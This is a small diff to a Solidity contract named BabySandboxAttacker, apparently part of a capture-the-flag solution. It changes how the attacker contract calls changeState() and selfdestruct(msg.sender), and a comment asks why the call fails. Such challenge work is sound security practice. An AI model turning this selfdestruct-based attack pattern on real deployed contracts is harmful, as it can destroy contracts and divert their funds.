@@ -30,11 +30,11 @@ contract BabySandboxAttacker {
 
 
         // why doesn't this work even with more gas available?
-        // self.changeState();
-        // selfdestruct(msg.sender);
-        try self.changeState() {
-            selfdestruct(msg.sender);
-        } catch {}
+        self.changeState();
+        selfdestruct(msg.sender);
+        // try self.changeState() {
+        //     selfdestruct(msg.sender);
+        // } catch {}
         // console.log("SUCC = %s", success);
         // selfdestruct(address(0x00));
 
